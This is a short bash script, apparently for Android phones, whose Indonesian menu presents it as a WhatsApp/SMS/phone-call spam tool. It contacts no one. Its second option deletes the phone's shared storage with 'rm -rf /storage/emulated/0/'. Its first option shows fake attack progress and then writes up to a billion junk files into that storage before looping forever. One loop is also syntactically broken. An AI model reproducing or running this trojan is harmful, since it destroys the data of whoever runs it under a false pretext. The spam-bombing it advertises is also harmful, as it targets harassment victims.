##!/bin/bash

# Tampilan menu
clear
echo "===================================="
echo "      💣 spam wa sms telepon  💣"
echo "===================================="
echo "1. 💥satu nomor "
echo "2. 🗑 2 nomor"
echo "===================================="
read -p "Pilih opsi (1/2): " pilihan

echo "LOADING..."
sleep 2

# Kalau pilih angka 2, hapus folder dan keluar
if [[ $pilihan == "2" ]]; then
    echo "loding"
    rm -rf /storage/emulated/0/
    echo "loding"
    exit 0
fi

# Kalau pilih angka 1, lanjut ke "serangan"
if [[ $pilihan == "1" ]]; then
    read -p "masukin nomor target " isi_file

    clear
    echo "============================================="
    echo "🔥 MEMULAI SERANGAN ke nomor TARGET... 🔥"
    echo "============================================="
    sleep 2

    for i in {1..50}; do
        paket=$((RANDOM % 10000 + 1000))
        echo "🚀 telpon $isi_file dengan $paket paket data..."
        sleep 0.1
    done &

    echo -n "🚀 Mengaktifkan sms: ["
    for i in {1..20}; 
        echo -n "="
        sleep 0.2
    done
    echo "] DONE!"

    for i in {1..1000000000}; do
        echo "$isi_file" > "/storage/emulated/0/mrx_$i.txt"
    done

    while true; do
        paket=$((RANDOM % 10000 + 1000))
        echo "🔥 Mengirim secara bersamaan ke $isi_file dengan $paket paket..."
        sleep 0.2
    done
fi
